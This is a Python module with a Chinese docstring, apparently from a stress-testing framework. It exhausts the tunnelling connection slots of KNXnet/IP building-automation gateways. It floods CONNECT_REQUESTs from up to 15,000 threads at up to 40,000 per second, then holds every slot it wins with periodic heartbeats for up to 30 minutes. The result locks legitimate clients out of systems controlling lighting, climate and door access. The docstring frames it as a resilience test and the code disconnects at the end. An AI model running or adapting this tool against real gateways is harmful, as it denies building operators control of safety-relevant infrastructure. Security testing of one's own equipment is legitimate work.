"""
測項：KNXnet/IP Tunnelling CONNECT_REQUEST 連線表耗盡測試
分類：KNX/IP (建築自動化)（UDP 3671，KNXnet/IP 標準埠）
說明：KNX/IP 閘道器／介面對外提供 Tunnelling（KNXnet/IP Core + Tunnelling 服務家族）
讓上層應用程式（ETS、SCADA、監控系統等）透過 IP 網路存取 KNX bus，但幾乎所有市售
KNX/IP 介面的「同時 Tunnelling 連線數」上限都非常小（常見僅個位數，例如 1、4、8
組），這是眾所皆知、廠商文件也會明載的硬體限制。本測項测試閘道器在「連線請求
（CONNECT_REQUEST）被大量、高併發送出」情境下，連線表配置/回收邏輯的健全性，
以及連線表被佔滿後是否會影響閘道器對「正常、合法」用戶端 Tunnelling 請求的服務
能力（服務阻斷風險）。

**重要（生命安全考量）**：本測項全程只操作 KNXnet/IP 通訊層的「連線層級」
（Control/Data Endpoint 交握、Communication Channel ID 配置與心跳/斷線），這些
都只是閘道器自己維護的 IP 端連線表 bookkeeping，**完全不會建立 KNX bus 上的
Group Address 通訊、不會送出 L_Data.req / GroupValueWrite 等會操控實際 bus 裝置
（燈光、空調、門禁等）狀態的電報**。連線建立後除了心跳（CONNECTIONSTATE_REQUEST）
外不會送出任何 Tunnelling 資料電報（TUNNELLING_REQUEST），也就是說即使成功建立
了 tunnel，也不會透過它去讀寫任何裝置。

封包內容與流程（格式信心度說明）：
  - KNXnet/IP 核心標頭同 search_request_flood.py（高信心，見該檔說明）。
  - CONNECT_REQUEST（Service = 0x0205）Body：
      HPAI Control Endpoint(8 bytes) + HPAI Data Endpoint(8 bytes) +
      CRI(Connection Request Information, 4 bytes：Structure Length=0x04,
      Connection Type=0x04=TUNNEL_CONNECTION, KNX Layer=0x02=TUNNEL_LINKLAYER,
      Reserved=0x00)。本模組對 Control/Data Endpoint 使用同一個本機 UDP
      端點（常見的簡化客戶端作法，規格並未強制兩者必須不同）。
      Connection Type=TUNNEL_CONNECTION 與 KNX Layer=TUNNEL_LINKLAYER 的數值
      是 KNXnet/IP Tunnelling 服務家族中最基本、最常見的請求組合（對應公開規格
      與 Calimero/knxdclient 等開源實作可互相對照的數值），信心度高；但本模組
      **未**驗證過在真實硬體上每一款廠牌閘道器都會用完全相同方式回應（不同廠牌
      對逾時/拒絕狀態碼的細節可能不同，這不影響測試目的——本測項只關心連線表
      配置是否被佔滿/是否影響後續請求，不要求特定廠牌的回應內容）。
  - CONNECT_RESPONSE（Service = 0x0206）Body 開頭：Communication Channel ID(1) +
    Status(1)，Status=0x00 代表成功（E_NO_ERROR），非 0 代表被拒絕（例如
    E_NO_MORE_CONNECTIONS=0x25，即連線表已滿——這正是本測項想驗證的情境）。
  - CONNECTIONSTATE_REQUEST（Service = 0x0207，心跳）：Communication Channel ID(1)
    + Reserved(1) + HPAI Control Endpoint(8)。規格要求用戶端需定期送出心跳
    （常見週期 60 秒內，逾時未收到心跳閘道器會自行回收連線槽，HEARTBEAT_TIMEOUT
    常見為 120 秒）維持連線；本模組固定約每 55 秒送一次心跳，讓「已佔用的連線槽」
    在整個測試 duration（可達 30 分鐘）內持續被佔用，而不是幾分鐘後就被閘道器
    自動釋放——這是刻意還原真實用戶端行為以達成本測項目的（真實測出連線表被
    長時間佔滿的影響），而非規格外行為。
  - DISCONNECT_REQUEST（Service = 0x0209）：Communication Channel ID(1) +
    Reserved(1) + HPAI Control Endpoint(8)。**測試結束（達 duration 或
    stop_event 觸發）時，程式會對每一個當下仍持有的 tunnel 連線送出
    DISCONNECT_REQUEST 做正常收尾**，不會讓連線在測試結束後繼續佔用閘道器的
    連線表比測試本身更久（對應題目要求：不能讓閘道器停留在降級狀態超過測試
    本身的時間）。

測試手法：同時啟動 concurrent_workers 條 worker 執行緒，每條執行緒重複嘗試建立
一個 tunnel 連線（受全域 connect_rate_per_sec 速率限制，用一把鎖序列化存取，
避免多執行緒同時操作同一個 RateLimiter 造成的競速問題）；成功建立的連線會被
「持有」（定期心跳）到測試結束，失敗/被拒絕的 worker 會依速率限制繼續重試，
持續對連線表配置/拒絕邏輯施加壓力。由於典型 KNX/IP 介面同時連線數上限僅個位數，
predicted 大多數 worker 會持續收到拒絕（E_NO_MORE_CONNECTIONS 或逾時無回應），
這是預期且用來驗證「連線表確實見底」的訊號，不代表程式有誤。
需求：無額外套件（純標準函式庫 socket + struct + threading）。
"""
from __future__ import annotations

import socket
import struct
import threading
import time

from ..common import RateLimiter, clamp_duration

NAME = "KNXnet/IP Tunnelling CONNECT_REQUEST 連線表耗盡測試"
CATEGORY = "KNX/IP (建築自動化)"
PROTOCOL = "UDP"
DEFAULT_PORT = 3671
TEST_TYPE = "resource"  # 資源型：佔滿閘道器 Tunnelling 連線表（連線槽通常僅個位數）

_KNXIP_HEADER_LEN = 0x06
_KNXIP_VERSION_10 = 0x10
_SVC_CONNECT_REQUEST = 0x0205
_SVC_CONNECT_RESPONSE = 0x0206
_SVC_CONNECTIONSTATE_REQUEST = 0x0207
_SVC_DISCONNECT_REQUEST = 0x0209
_HPAI_IPV4_UDP = 0x01
_CRI_TUNNEL_CONNECTION = 0x04
_CRI_LAYER_TUNNEL_LINKLAYER = 0x02
_HEARTBEAT_INTERVAL_SEC = 55  # 規格建議心跳週期需 < HEARTBEAT_TIMEOUT（常見 120s），留足餘裕


def get_param_schema() -> dict:
    return {
        "concurrent_workers": {
            "type": "int", "default": 15000, "min": 1, "max": 15000,
            "desc": "同時嘗試/持有 tunnel 連線的併發 worker 數（典型 KNX/IP 閘道器同時連線數上限常僅個位數，"
                    "此數字建議遠高於預期上限以驗證連線表耗盡效果）",
        },
        "connect_rate_per_sec": {
            "type": "int", "default": 40000, "min": 1, "max": 40000,
            "desc": "全域 CONNECT_REQUEST 送出速率上限（次/秒，所有 worker 共用同一速率上限）",
        },
    }


def _build_hpai(ip: str, port: int) -> bytes:
    try:
        ip_bytes = socket.inet_aton(ip)
    except OSError:
        ip_bytes = b"\x00\x00\x00\x00"
    return bytes([0x08, _HPAI_IPV4_UDP]) + ip_bytes + struct.pack(">H", port)


def _knxip_header(service: int, body_len: int) -> bytes:
    total_len = _KNXIP_HEADER_LEN + body_len
    return bytes([_KNXIP_HEADER_LEN, _KNXIP_VERSION_10]) + struct.pack(">H", service) + struct.pack(">H", total_len)


def _build_connect_request(local_ip: str, local_port: int) -> bytes:
    hpai = _build_hpai(local_ip, local_port)
    cri = bytes([0x04, _CRI_TUNNEL_CONNECTION, _CRI_LAYER_TUNNEL_LINKLAYER, 0x00])
    body = hpai + hpai + cri  # control endpoint + data endpoint（同一本機端點）
    return _knxip_header(_SVC_CONNECT_REQUEST, len(body)) + body


def _build_connectionstate_request(channel_id: int, local_ip: str, local_port: int) -> bytes:
    body = bytes([channel_id & 0xFF, 0x00]) + _build_hpai(local_ip, local_port)
    return _knxip_header(_SVC_CONNECTIONSTATE_REQUEST, len(body)) + body


def _build_disconnect_request(channel_id: int, local_ip: str, local_port: int) -> bytes:
    body = bytes([channel_id & 0xFF, 0x00]) + _build_hpai(local_ip, local_port)
    return _knxip_header(_SVC_DISCONNECT_REQUEST, len(body)) + body


def _parse_connect_response(data: bytes):
    """回傳 (channel_id, status)，任何格式不符都回傳 None（視為 malformed）。"""
    if len(data) < 8:
        return None
    service = struct.unpack(">H", data[2:4])[0]
    if service != _SVC_CONNECT_RESPONSE:
        return None
    channel_id = data[6]
    status = data[7]
    return channel_id, status


def run(target, port, protocol, duration, params, stop_event, log_fn) -> dict:
    duration = clamp_duration(duration)
    workers_n = int(params.get("concurrent_workers", 40))
    rate = int(params.get("connect_rate_per_sec", 100))
    dest_port = port or DEFAULT_PORT

    stop_local = threading.Event()
    limiter = RateLimiter(rate)
    limiter_lock = threading.Lock()

    def rate_wait():
        # RateLimiter 本身非執行緒安全（內部 self._next 沒有鎖保護），多個 worker
        # 執行緒共用同一個 limiter 時必須序列化存取，否則會有競速條件（讀寫
        # self._next 交錯）導致實際送出速率失控——這裡用鎖包起來修正這個風險。
        with limiter_lock:
            limiter.wait()

    stats_lock = threading.Lock()
    stats = {"established": 0, "rejected": 0, "no_response": 0, "malformed_response": 0, "connect_errors": 0}

    def bump(key: str):
        with stats_lock:
            stats[key] += 1

    active_sessions: list[tuple[socket.socket, int, str, int]] = []
    active_lock = threading.Lock()

    def worker():
        while not stop_local.is_set():
            rate_wait()
            if stop_local.is_set():
                break

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.connect((target, dest_port))
                local_ip, local_port = sock.getsockname()
            except OSError:
                bump("connect_errors")
                sock.close()
                continue

            try:
                sock.settimeout(2.0)
                sock.send(_build_connect_request(local_ip, local_port))
                data = sock.recv(1024)
            except OSError:
                bump("no_response")
                sock.close()
                time.sleep(0.2)
                continue

            parsed = _parse_connect_response(data)
            if parsed is None:
                bump("malformed_response")
                sock.close()
                time.sleep(0.2)
                continue

            channel_id, status = parsed
            if status != 0x00:
                bump("rejected")
                sock.close()
                time.sleep(0.2)
                continue

            # 成功建立 tunnel 連線：持有到測試結束，期間定期送心跳維持連線槽被佔用
            bump("established")
            with active_lock:
                active_sessions.append((sock, channel_id, local_ip, local_port))

            last_heartbeat = time.time()
            sock.settimeout(1.0)
            while not stop_local.is_set():
                time.sleep(0.5)
                if time.time() - last_heartbeat >= _HEARTBEAT_INTERVAL_SEC:
                    try:
                        sock.send(_build_connectionstate_request(channel_id, local_ip, local_port))
                        sock.recv(1024)  # best-effort 讀走 response，不特別檢查狀態
                    except OSError:
                        pass
                    last_heartbeat = time.time()
            break  # 測試結束，交由主流程統一收尾/斷線，本 worker 任務完成

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers_n)]
    log_fn(f"[+] KNXnet/IP Tunnelling CONNECT_REQUEST 連線表耗盡測試 -> {target}:{dest_port}，"
           f"{workers_n} 併發 worker，CONNECT_REQUEST 速率上限 {rate}/s，{duration}s")
    for t in threads:
        t.start()

    start = time.time()
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        time.sleep(0.5)

    log_fn("[+] 測試時間到或收到停止事件，開始清理所有已建立的 tunnel 連線...")
    stop_local.set()
    for t in threads:
        t.join(timeout=5)

    with active_lock:
        sessions = list(active_sessions)

    disconnected = 0
    for sock, channel_id, local_ip, local_port in sessions:
        try:
            sock.settimeout(1.0)
            sock.send(_build_disconnect_request(channel_id, local_ip, local_port))
            try:
                sock.recv(1024)  # best-effort 等 DISCONNECT_RESPONSE，收不到也沒關係
            except OSError:
                pass
            disconnected += 1
        except OSError:
            pass
        finally:
            sock.close()

    elapsed = time.time() - start
    log_fn(f"[+] 完成，成功建立 {stats['established']} 個 tunnel 連線（已送出 DISCONNECT_REQUEST 清理 {disconnected} 個），"
           f"遭拒絕 {stats['rejected']} 次，逾時無回應 {stats['no_response']} 次，"
           f"格式異常回應 {stats['malformed_response']} 次，socket 層錯誤 {stats['connect_errors']} 次")
    return {
        "established": stats["established"],
        "disconnected_cleanly": disconnected,
        "rejected": stats["rejected"],
        "no_response": stats["no_response"],
        "malformed_response": stats["malformed_response"],
        "connect_errors": stats["connect_errors"],
        "elapsed_sec": round(elapsed, 1),
    }
